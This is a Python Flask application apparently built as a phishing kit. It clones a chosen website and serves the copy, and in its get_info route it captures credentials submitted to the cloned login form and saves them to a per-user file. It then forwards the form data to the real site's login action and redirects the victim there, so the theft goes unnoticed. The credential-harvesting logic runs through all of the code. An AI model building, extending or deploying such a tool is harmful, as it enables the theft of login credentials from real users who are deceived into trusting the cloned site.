from user import User
from config import Config
from flask import Flask, render_template, request, flash,Markup, redirect
from site_duplicator import SiteDuplicator
import logging
import tldextract
from state import State
import urllib.parse
import urllib.request


def factory():
    flask_app = Flask(__name__)
    flask_app.config.from_object(Config)

    return flask_app


app = factory()


@app.route("/get_info", methods=['POST'])
def get_info():
    """
    Function is used for storing user details and creating a file
    submits login form to site and redirect to original site
    :return: the original site
    """
    State.login_form = request.form
    State.current_user = User(request)
    State.current_user.create_user_file()
    logging.debug(get_info.__name__ + " created user file")
    if State.login_form is not None and State.prev_login_action is not None:
        print("inside if")
        data = urllib.parse.urlencode(State.login_form).encode('utf-8')             # prepare to send back form to original site
        urllib.request.urlopen(State.prev_login_action, data=data)  # send form data
    return redirect(State.prev_login_action, code=307)                        # redirect to original site


@app.route('/dup_site', methods=['POST'])
def dup_site():
    """
        duplicates the site requested from the user and displays the url
    """
    State.site = request.form['site']
    duplicate_site()
    return render_template('index.html', duplicated=State.duplicated, site=str(State.domain))


@app.route("/clones/<string:domain>")
def run_clone(domain):
    """
    Displays the cloned site
    :param domain: the domain of the site
    :return: duplicated site
    """
    flash(State.html_to_display)
    logging.debug(run_clone.__name__ + " running cloned website")
    return render_template('result.html')


@app.route("/redirect_login/<site>", methods=['GET'])
def redirect_login(site):
    """
    Function is used for redirecting login url from already duplicated site
    :param site: login site to duplicate
    :return: duplicated login site
    """
    State.site = site.replace("^s^", '/')
    duplicate_site()
    flash(State.html_to_display)
    return render_template('result.html')


@app.route("/")
def index():
    return render_template('index.html', duplicated=False)


def duplicate_site():
    """
    duplicates the requested site in State.site
    :return:
    """
    State.domain = tldextract.extract(State.site).domain
    sd = SiteDuplicator(State.site)                             # create a site duplicator with current site
    if sd.generate_duplicated_site():                           # downloads the html and obtain a beautiful soup object
        State.html_to_display = Markup(sd.soup.contents[2])     # mark content as safe to display
        State.duplicated = True
        State.prev_login_action = sd.prev_login_action                # saves the original action of the login form
        logging.debug(dup_site.__class__.__name__ + " new html is ready")


if __name__ == '__main__':
    # logging.getLogger().setLevel(logging.DEBUG)
    app.run()
